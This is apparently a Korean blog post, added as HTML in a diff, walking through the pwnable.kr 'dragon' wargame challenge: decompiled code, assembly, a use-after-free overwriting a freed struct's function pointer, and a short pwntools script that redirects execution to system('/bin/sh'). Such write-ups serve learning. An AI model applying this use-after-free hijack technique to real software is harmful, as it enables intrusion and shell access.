+          <span class="n">printf</span><span class="p">(</span><span class="s">&#34;But The Dragon Deals %d Damage To You!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">*</span><span class="p">((</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">3</span><span class="p">));</span>
+          <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">-=</span> <span class="o">*</span><span class="p">((</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">3</span><span class="p">);</span>
+          <span class="n">printf</span><span class="p">(</span><span class="s">&#34;And The Dragon Heals %d HP!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">*</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">9</span><span class="p">));</span>
+          <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+=</span> <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">9</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">free</span><span class="p">(</span><span class="n">ptr</span><span class="p">);</span>
+      <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">while</span> <span class="p">(</span> <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">);</span>
+  <span class="n">free</span><span class="p">(</span><span class="n">ptr</span><span class="p">);</span>
+  <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span></code></pre></div>
+<p>여기서 핵심은.. 이 경기에서 지든 이기든 ptr 을 free 해준다는것이다.. 이것은 dragon 의 구조체 주소를 ptr 로 받았기 때문에, 곧 dragon 을 free 해준다는 것과 같다.</p>
+
+<p>자 그럼 이렇게 죽이면 if(v3) 저 부분이 나타난다.
+그다음.. <code>__isoc99_scanf(&quot;%16s&quot;, v2);</code> 짜잔 무려 16 바이트를 쓸수있게 해준다..!
+근데 아까 free 해준 dragon 과 똑같은 16바이트잖아?? 이거 드래곤 구조체 가 할당되었단 heap
+주소에 덮어씌우는 꼴이 된다.</p>
+
+<p>근데 그다음 희괴한 c 코드가 보이는데.. 무슨일을 하는지 어셈으로 봐보자.</p>
+<div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh">   0x080488c0 &lt;+386&gt;:   mov    eax,DWORD PTR <span class="o">[</span>ebp-0x10<span class="o">]</span>
+   0x080488c3 &lt;+389&gt;:   mov    eax,DWORD PTR <span class="o">[</span>eax<span class="o">]</span>
+   0x080488c5 &lt;+391&gt;:   mov    edx,DWORD PTR <span class="o">[</span>ebp-0x10<span class="o">]</span>
+   0x080488c8 &lt;+394&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,edx
+   0x080488cb &lt;+397&gt;:   call   eax</code></pre></div>
+<p>띠용.. ebp - 0x10 에 써있던 값의 주소값에 해당하는 함수를 불러버린다.. 뭐지
+ebp - 0x10 은 dragon 구조체가 저장되있어던 주소다. 즉 아까 우리가 scanf 로 받았던 그 주소가 eax 에 들어가게 되버린다. 호모나 섹상에. 즉 우리는 return 주소를 바꿀수 있게 됐다.
+마지막으로 SecretLevel 함수를 보면,</p>
+<div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh">unsigned int SecretLevel<span class="o">()</span>
+<span class="o">{</span>
+  char s1<span class="p">;</span> // <span class="o">[</span>esp+12h<span class="o">]</span> <span class="o">[</span>ebp-16h<span class="o">]</span>
+  unsigned int v2<span class="p">;</span> // <span class="o">[</span>esp+1Ch<span class="o">]</span> <span class="o">[</span>ebp-Ch<span class="o">]</span>
+
+  <span class="nv">v2</span> <span class="o">=</span> __readgsdword<span class="o">(</span>0x14u<span class="o">)</span><span class="p">;</span>
+  printf<span class="o">(</span><span class="s2">&#34;Welcome to Secret Level!\nInput Password : &#34;</span><span class="o">)</span><span class="p">;</span>
+  __isoc99_scanf<span class="o">(</span><span class="s2">&#34;%10s&#34;</span>, <span class="p">&amp;</span>s1<span class="o">)</span><span class="p">;</span>
+  <span class="k">if</span> <span class="o">(</span> strcmp<span class="o">(</span><span class="p">&amp;</span>s1, <span class="s2">&#34;Nice_Try_But_The_Dragons_Won&#39;t_Let_You!&#34;</span><span class="o">)</span> <span class="o">)</span>
+  <span class="o">{</span>
+    puts<span class="o">(</span><span class="s2">&#34;Wrong!\n&#34;</span><span class="o">)</span><span class="p">;</span>
+    exit<span class="o">(</span>-1<span class="o">)</span><span class="p">;</span>
+  <span class="o">}</span>
+  system<span class="o">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="o">)</span><span class="p">;</span>
+  <span class="k">return</span> __readgsdword<span class="o">(</span>0x14u<span class="o">)</span> ^ v2<span class="p">;</span>
+<span class="o">}</span></code></pre></div>
+<p>와우 system(&ldquo;bin/sh&rdquo;) 저기로 뛰면 되것당. gdb 로 봐보쟙</p>
+<div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh">   0x08048dbf &lt;+71&gt;:    mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x804935c
+   0x08048dc6 &lt;+78&gt;:    call   0x8048530 &lt;system@plt&gt;</code></pre></div>
+<p>즉, 0x8048dbf 주소로 뛰어주면 된당.</p>
+
+<p>파이썬 코드로 작성해보쟈.</p>
+<div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh">from pwn import  *
+
+<span class="nv">p</span> <span class="o">=</span> remote<span class="o">(</span><span class="s2">&#34;pwnable.kr&#34;</span>,9004<span class="o">)</span>
+
+p.send<span class="o">(</span><span class="s2">&#34;2\n2\n1\n&#34;</span>+<span class="s2">&#34;3\n3\n2\n&#34;</span>*4+<span class="s2">&#34;\xbf\x8d\x04\x08&#34;</span><span class="o">)</span>
+
+p.interactive<span class="o">()</span></code></pre></div>
+<p>오후 간단쓰..</p>
+
+
+        
+          <div class="blog-tags">
+            
+              <a href="https://eiparyen.github.io/tags/pwnable/">pwnable</a>&nbsp;
+            
+          </div>
+        
+
+        
+            <hr/>
+            <section id="social-share">
+              <div class="list-inline footer-links">
+                
+
+<div class="share-box" aria-hidden="true">
+    <ul class="share">
+      
+      <li>
+        <a href="//twitter.com/share?url=https%3a%2f%2feiparyen.github.io%2fpwnable%2f2018-12-19%2f&amp;text=2st%20Problem%20-%20dowoo&amp;via=" target="_blank" title="Share on Twitter">
+          <i class="fab fa-twitter"></i>
+        </a>
+      </li>
+  
+      
+      <li>
+        <a href="//plus.google.com/share?url=https%3a%2f%2feiparyen.github.io%2fpwnable%2f2018-12-19%2f" target="_blank" title="Share on Google Plus">
+          <i class="fab fa-google-plus"></i>
+        </a>
+      </li>
+  
+      
+      <li>
+        <a href="//www.facebook.com/sharer/sharer.php?u=https%3a%2f%2feiparyen.github.io%2fpwnable%2f2018-12-19%2f" target="_blank" title="Share on Facebook">
+          <i class="fab fa-facebook"></i>
+        </a>
+      </li>
+  
+      
+      <li>
+        <a href="//reddit.com/submit?url=https%3a%2f%2feiparyen.github.io%2fpwnable%2f2018-12-19%2f&amp;title=2st%20Problem%20-%20dowoo" target="_blank" title="Share on Reddit">
+          <i class="fab fa-reddit"></i>
+        </a>
+      </li>
+  
+      
+      <li>
+        <a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2feiparyen.github.io%2fpwnable%2f2018-12-19%2f&amp;title=2st%20Problem%20-%20dowoo" target="_blank" title="Share on LinkedIn">
+          <i class="fab fa-linkedin"></i>
+        </a>
+      </li>
+  
+      
+      <li>
+        <a href="//www.stumbleupon.com/submit?url=https%3a%2f%2feiparyen.github.io%2fpwnable%2f2018-12-19%2f&amp;title=2st%20Problem%20-%20dowoo" target="_blank" title="Share on StumbleUpon">
+          <i class="fab fa-stumbleupon"></i>
+        </a>
+      </li>
+  
+      
+      <li>
+        <a href="//www.pinterest.com/pin/create/button/?url=https%3a%2f%2feiparyen.github.io%2fpwnable%2f2018-12-19%2f&amp;description=2st%20Problem%20-%20dowoo" target="_blank" title="Share on Pinterest">
+          <i class="fab fa-pinterest"></i>
+        </a>
+      </li>
+    </ul>
+  </div>
+  
+              </div>
+            </section>
+        
+
+        
+      </article>
+
+      
+        <ul class="pager blog-pager">
+          
+            <li class="previous">
+              <a href="https://eiparyen.github.io/pwnable/2019-1-08/" data-toggle="tooltip" data-placement="top" title="3st Problem - dowoo">&larr; Previous Post</a>
+            </li>
+          
+          
+            <li class="next">
+              <a href="https://eiparyen.github.io/pwnable/2018-12-17/" data-toggle="tooltip" data-placement="top" title="1st Problem - dowoo">Next Post &rarr;</a>
+            </li>
+          
+        </ul>
+      
+
+
+      
+        
+          
+          <div class="disqus-comments">                  
+            <button id="show-comments" class="btn btn-default" type="button">Show <span class="disqus-comment-count" data-disqus-url="https://eiparyen.github.io/pwnable/2018-12-19">comments</span></button>
+            <div id="disqus_thread"></div>
+
+            <script type="text/javascript">
+              var disqus_config = function () {
+              this.page.url = 'https:\/\/eiparyen.github.io\/pwnable\/2018-12-19';
+            };
+
+          </script>
+          </div>
+          
+        
+        
+      
+
+    </div>
+  </div>
+</div>
+
+    <footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center footer-links">
+          
+          
+          <li>
+            
+            <a href="https://eiparyen.github.io/index.xml" title="RSS">
+            
+              <span class="fa-stack fa-lg">
+                <i class="fas fa-circle fa-stack-2x"></i>
+                <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+              </span>
+            </a>
+          </li>
+          
+        </ul>
+        <p class="credits copyright text-muted">
+          
+
+          &nbsp;&bull;&nbsp;&copy;
+          
+            2018
+          
+
+          
+            &nbsp;&bull;&nbsp;
+            <a href="https://eiparyen.github.io">Eiparyen</a>
+          
+        </p>
+        
+        <p class="credits theme-by text-muted">
+          <a href="http://gohugo.io">Hugo v0.54-DEV</a> powered &nbsp;&bull;&nbsp; Theme by <a href="http://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a> adapted to <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a>
+          
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.js" integrity="sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/contrib/auto-render.min.js" integrity="sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe" crossorigin="anonymous"></script>
+<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+<script src="https://eiparyen.github.io/js/main.js"></script>
+<script src="https://eiparyen.github.io/js/highlight.min.js"></script>
+<script> hljs.initHighlightingOnLoad(); </script>
+<script> $(document).ready(function() {$("pre.chroma").css("padding","0");}); </script><script> renderMathInElement(document.body); </script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script>
+<script src="https://eiparyen.github.io/js/load-photoswipe.js"></script>
+
+
+
+
+
+
+
+<script type="text/javascript">
+$(function(){
+  $('#show-comments').on('click', function(){
+    var disqus_shortname = 'eiparyen';
+      
+    (function() {
+      var disqus = document.createElement('script'); 
+      disqus.type = 'text/javascript'; 
+      disqus.async = true;
+      disqus.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(disqus);
+    })();
+      
+    $(this).hide(); 
+    });
+  });
+      
+</script>
+<script id="dsq-count-scr" src="//eiparyen.disqus.com/count.js" async></script>
+
+
+
+
+  </body>
+</html>
+
